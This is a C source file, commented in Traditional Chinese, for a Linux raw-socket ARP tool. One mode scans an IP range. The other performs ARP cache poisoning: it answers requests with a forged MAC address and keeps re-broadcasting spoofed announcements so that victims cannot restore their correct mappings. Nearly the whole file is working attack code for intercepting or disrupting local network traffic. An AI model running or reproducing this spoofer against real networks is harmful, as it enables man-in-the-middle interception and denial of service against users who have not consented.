#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <pthread.h>

#include "Bool.h"
#include "ARP.h"
#include "NetUtil.h"

#define START_WAIT_TIME 3
#define ARP_REPLY_WAIT_TIME 10

// 發送 Socket
int sendSocket;

// Socket 位址
struct sockaddr_ll sendSocketAddress, receiveSocketAddress;
socklen_t socketAddressLength;

// 網路卡資訊
char* adapterIPAddress;
unsigned char adapterMACAddress[ETH_ALEN];
int adapterIndex;

// 執行緒是否繼續執行
volatile bool run = true;

// 使用者輸入資訊
char* inputMAC;
unsigned char* inputMACAddress;

// 發生錯誤中止程式
void errorExit(const char* errorMessage) {
    perror(errorMessage);
    exit(EXIT_FAILURE);
}

// ARP 請求
void ARPRequest(const char* dstIPAddress) {
    char packet[ETHER_ARP_PACKET_LENGTH];
    unsigned char dstMACAddress[ETH_ALEN] = BROADCAST_MAC_ADDRESS;
    bzero(packet, ETHER_ARP_PACKET_LENGTH);

    // 填充乙太網路標頭
    struct ether_header* etherHeader = (struct ether_header*) packet;
    memcpy(etherHeader->ether_shost, adapterMACAddress, ETH_ALEN); // 來源 MAC 位址
    memcpy(etherHeader->ether_dhost, dstMACAddress, ETH_ALEN); // 目標 MAC 位址
    etherHeader->ether_type = htons(ETHERTYPE_ARP); // ARP 協定
    // ARP 封包
    struct ether_arp* etherARP = fillARPRequestPacket(adapterMACAddress, adapterIPAddress, dstIPAddress);
    memcpy(packet + ETHER_HEADER_LENGTH, etherARP, ETHER_ARP_LENGTH);
    free(etherARP);

    // 發送請求
    sendto(sendSocket, packet, ETHER_ARP_PACKET_LENGTH, 0, (struct sockaddr*) &sendSocketAddress, sizeof (struct sockaddr_ll));
}

// ARP 欺騙請求 [自我更新]
// 這是用來廣播自己的假 MAC 位址，用來防止受害主機改回正確資料
void ARPSpoofRequest(const u_int8_t* srcMACAddress, const u_int8_t* srcIPAddress) {
    char packet[ETHER_ARP_PACKET_LENGTH];
    unsigned char dstMACAddress[ETH_ALEN] = BROADCAST_MAC_ADDRESS;
    bzero(packet, ETHER_ARP_PACKET_LENGTH);

    // 填充乙太網路標頭
    struct ether_header* etherHeader = (struct ether_header*) packet;
    memcpy(etherHeader->ether_shost, srcMACAddress, ETH_ALEN); // 來源 MAC 位址
    memcpy(etherHeader->ether_dhost, dstMACAddress, ETH_ALEN); // 目標 MAC 位址
    etherHeader->ether_type = htons(ETHERTYPE_ARP); // ARP 協定
    // ARP 封包
    struct ether_arp* etherARP = fillARPSpoofRequestPacket(srcMACAddress, srcIPAddress);
    memcpy(packet + ETHER_HEADER_LENGTH, etherARP, ETHER_ARP_LENGTH);
    free(etherARP);

    // 發送請求
    sendto(sendSocket, packet, ETHER_ARP_PACKET_LENGTH, 0, (struct sockaddr*) &sendSocketAddress, sizeof (struct sockaddr_ll));
}

// ARP 欺騙回應
void ARPSpoofReply(const u_int8_t* srcMACAddress, const u_int8_t* srcIPAddress, const u_int8_t* dstIPAddress) {
    char packet[ETHER_ARP_PACKET_LENGTH];
    bzero(packet, ETHER_ARP_PACKET_LENGTH);

    // 填充乙太網路標頭
    struct ether_header* etherHeader = (struct ether_header*) packet;
    memcpy(etherHeader->ether_shost, inputMACAddress, ETH_ALEN); // 來源 MAC 位址
    memcpy(etherHeader->ether_dhost, srcMACAddress, ETH_ALEN); // 目標 MAC 位址
    etherHeader->ether_type = htons(ETHERTYPE_ARP); // ARP 協定
    // ARP 封包
    struct ether_arp* etherARP = fillARPReplySpoofPacket(srcMACAddress, srcIPAddress, dstIPAddress, inputMACAddress);
    memcpy(packet + ETHER_HEADER_LENGTH, etherARP, ETHER_ARP_LENGTH);
    free(etherARP);

    // 發送請求
    sendto(sendSocket, packet, ETHER_ARP_PACKET_LENGTH, 0, (struct sockaddr*) &sendSocketAddress, sizeof (struct sockaddr_ll));
}

// 初始化傳送 Socket 與網路卡資訊
void init(const char* adapterName) {
    if ((sendSocket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == INVALID_SOCKET) {
        errorExit("發送 Socket 初始化失敗 ");
    }
    struct ifreq adapter;
    bzero(&sendSocketAddress, sizeof (struct sockaddr_ll));
    bzero(&adapter, sizeof (struct ifreq));

    // 網路卡名稱
    memcpy(adapter.ifr_name, adapterName, strlen(adapterName));

    // 取得網路卡索引
    if (ioctl(sendSocket, SIOCGIFINDEX, &adapter) != 0) {
        errorExit("取得網路卡索引時失敗 ");
    }
    // 綁定網路卡 (發送時代入 Socket 位址，以及接收時的過濾依據)
    adapterIndex = adapter.ifr_ifindex;
    sendSocketAddress.sll_ifindex = adapterIndex;
    sendSocketAddress.sll_family = PF_PACKET;

    // 取得網路卡 IP
    if (ioctl(sendSocket, SIOCGIFADDR, &adapter) != 0) {
        errorExit("取得網路卡 IP 位址時失敗 ");
    }
    const char* ip = inet_ntoa(((struct sockaddr_in*) &(adapter.ifr_addr))->sin_addr);
    int length = strlen(ip);
    adapterIPAddress = malloc(length + 1);
    strcpy(adapterIPAddress, ip);
    printf("網路卡 IP : %s\n", adapterIPAddress);

    // 取得網路卡 MAC 位址
    if (ioctl(sendSocket, SIOCGIFHWADDR, &adapter) != 0) {
        errorExit("取得網路卡 MAC 位址時失敗 ");
    }
    memcpy(adapterMACAddress, adapter.ifr_hwaddr.sa_data, ETH_ALEN);
    printf("網路卡 MAC 位址 : %02x:%02x:%02x:%02x:%02x:%02x\n", adapterMACAddress[0], adapterMACAddress[1], adapterMACAddress[2], adapterMACAddress[3], adapterMACAddress[4], adapterMACAddress[5]);
}

// ARP 回應接收執行緒
void* ARPReceiveReplyThread(void* arg) {
    char packet[ETHER_ARP_PACKET_LENGTH];
    int receiveSocket;

    if ((receiveSocket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == INVALID_SOCKET) {
        errorExit("接收 Socket 初始化失敗 ");
    }

    printf("ARP 接收執行緒初始化完畢 正在接收封包\n");
    while (run) {
        bzero(packet, ETHER_ARP_PACKET_LENGTH);
        int length = recvfrom(receiveSocket, packet, ETHER_ARP_PACKET_LENGTH, 0, (struct sockaddr*) &receiveSocketAddress, &socketAddressLength);
        // 比對網路卡
        if (adapterIndex != receiveSocketAddress.sll_ifindex) {
            continue;
        }
        if (length <= 0) {
            continue;
        }
        // 剝去乙太網路標頭
        struct ether_arp* etherARP = (struct ether_arp*) (packet + ETHER_HEADER_LENGTH);
        // 過濾 ARP 回應封包
        if (ntohs(etherARP->arp_op) == ARPOP_REPLY) {
            u_int8_t *srcIPByte = etherARP->arp_spa, *srcMACByte = etherARP->arp_sha;
            printf("[接收 ARP 回應] IP 位址 : %u.%u.%u.%u 對應 MAC 位址為 [ %02x:%02x:%02x:%02x:%02x:%02x ]\n", srcIPByte[0], srcIPByte[1], srcIPByte[2], srcIPByte[3], srcMACByte[0], srcMACByte[1], srcMACByte[2], srcMACByte[3], srcMACByte[4], srcMACByte[5]);
        }
    }

    printf("關閉接收 Socket\n");
    close(receiveSocket);
    pthread_exit(NULL);
}

// 比對 MAC 位址
bool isSameMAC(unsigned char* left, unsigned char* right) {
    for (int i = 0; i < ETH_ALEN; ++i) {
        if (left[i] != right[i]) {
            return false;
        }
    }
    return true;
}

// ARP 欺騙回應執行緒
void* ARPSpoofThread(void* arg) {
    char packet[ETHER_ARP_PACKET_LENGTH];
    int receiveSocket;

    if ((receiveSocket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == INVALID_SOCKET) {
        errorExit("接收 Socket 初始化失敗 ");
    }

    printf("即將開始進行 ARP 欺騙，結束時請按下 Ctrl + C\n");
    sleep(START_WAIT_TIME);
    printf("ARP 接收執行緒初始化完畢 正在接收封包\n");
    while (run) {
        bzero(packet, ETHER_ARP_PACKET_LENGTH);
        int length = recvfrom(receiveSocket, packet, ETHER_ARP_PACKET_LENGTH, 0, (struct sockaddr*) &receiveSocketAddress, &socketAddressLength);
        // 比對網路卡
        if (adapterIndex != receiveSocketAddress.sll_ifindex) {
            continue;
        }
        if (length <= 0) {
            continue;
        }
        // 剝去乙太網路標頭
        struct ether_arp* etherARP = (struct ether_arp *) (packet + ETHER_HEADER_LENGTH);
        char srcIP[IP_ADDRESS_STRING_MAX_LENGTH], dstIP[IP_ADDRESS_STRING_MAX_LENGTH];
        u_int8_t *srcIPByte = etherARP->arp_spa, *dstIPByte = etherARP->arp_tpa, *srcMACByte = etherARP->arp_sha;
        snprintf(srcIP, sizeof (srcIP), "%d.%d.%d.%d", srcIPByte[0], srcIPByte[1], srcIPByte[2], srcIPByte[3]);
        snprintf(dstIP, sizeof (dstIP), "%d.%d.%d.%d", dstIPByte[0], dstIPByte[1], dstIPByte[2], dstIPByte[3]);
        int type = ntohs(etherARP->arp_op);
        switch (type) {
        case ARPOP_REQUEST: {
            printf("[接收 ARP 請求] 詢問 IP 位址 : %s 請將答案發送至 %s [ %02x:%02x:%02x:%02x:%02x:%02x ]\n", dstIP, srcIP, srcMACByte[0], srcMACByte[1], srcMACByte[2], srcMACByte[3], srcMACByte[4], srcMACByte[5]);
            if (strcmp(adapterIPAddress, dstIP) != 0) {
                if (strcmp(srcIP, dstIP) == 0) {
                    // 對方不乖，試圖透過詢問自己修正回正確 MAC 位址
                    ARPSpoofRequest(inputMACAddress, srcIPByte);
                    printf("[接收到對方自我更新請求 重新發送欺騙 ARP 自我更新] ");
                } else {
                    // 欺騙 ARP 回應
                    ARPSpoofReply(srcMACByte, srcIPByte, dstIPByte);
                    printf("[發送欺騙 ARP 回應] ");
                }
                printf("IP 位址 : %s 對應 MAC 位址為 [ %s ]\n", dstIP, inputMAC);
            } else if (!isSameMAC(adapterMACAddress, srcMACByte)) {
                ARPSpoofRequest(adapterMACAddress, dstIPByte);
            }
            break;
        }
        case ARPOP_REPLY: {
            if (strcmp(adapterIPAddress, srcIP) != 0) {
                // 對方不乖，試圖修正回正確 MAC 位址，在這裡重新 Announce
                ARPSpoofRequest(inputMACAddress, srcIPByte);
                printf("[接收到對方回應 重新發送欺騙 ARP 自我更新] IP 位址 : %s 對應 MAC 位址為 [ %s ]\n", srcIP, inputMAC);
            } else {
                ARPSpoofRequest(adapterMACAddress, srcIPByte);
            }
            break;
        }
        }
    }

    printf("關閉接收 Socket\n");
    close(receiveSocket);
    pthread_exit(NULL);
}

// 程式入口點
int main(int argc, const char* argv[]) {
    if (geteuid() != 0) {
        printf("請以 Root 權限執行本程式 ...\n");
        exit(EXIT_FAILURE);
    }
    if (argc < 4) {
        printf("使用方法\n");
        printf("發起 ARP 請求 : %s [網路卡名稱] 1 [起始 IP] [終止 IP]\n", argv[0]);
        printf("進行 ARP 回應欺騙 : %s [網路卡名稱] 2 [偽造 MAC 位址]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char* adapterName = argv[1];
    int type = atoi(argv[2]);

    pthread_t thread;
    switch (type) {
    case 1: {
        if (argc < 5) {
            errorExit("請輸入正確 IP 位址 ");
        }

        init(adapterName);
        pthread_create(&thread, NULL, ARPReceiveReplyThread, "ARPReceiveReplyThread");
        const char *inputStartIP = argv[3], *inputEndIP = argv[4];
        if (!isValidIPv4Address(inputStartIP) || !isValidIPv4Address(inputEndIP)) {
            errorExit("IP 位址輸入錯誤 ");
        }

        unsigned int startIP = htonl(inet_addr(inputStartIP)), endIP = htonl(inet_addr(inputEndIP));
        if (startIP > endIP) {
            errorExit("IP 位址範圍錯誤 ");
        }

        sleep(START_WAIT_TIME);
        for (unsigned int i = startIP; i <= endIP; ++i) {
            struct in_addr ip;
            ip.s_addr = ntohl(i);
            ARPRequest(inet_ntoa(ip));
        }
        sleep(ARP_REPLY_WAIT_TIME);
        run = false;
        pthread_join(thread, NULL);
        break;
    }
    case 2: {
        if (argc < 4) {
            errorExit("請輸入 MAC 位址 ");
        }
        inputMAC = argv[3];
        if (!isValidMACAddress(inputMAC)) {
            errorExit("請輸入正確 MAC 位址 ");
        }
        inputMACAddress = MACAddressToByteArray(inputMAC);

        init(adapterName);
        pthread_create(&thread, NULL, ARPSpoofThread, "ARPSpoofThread");
        pthread_join(thread, NULL);
        free(inputMACAddress);
        break;
    }
    default: {
        errorExit("請輸入正確模式 ");
    }
    }

    printf("關閉發送 Socket\n");
    close(sendSocket);

    free(adapterIPAddress);
    return EXIT_SUCCESS;
}
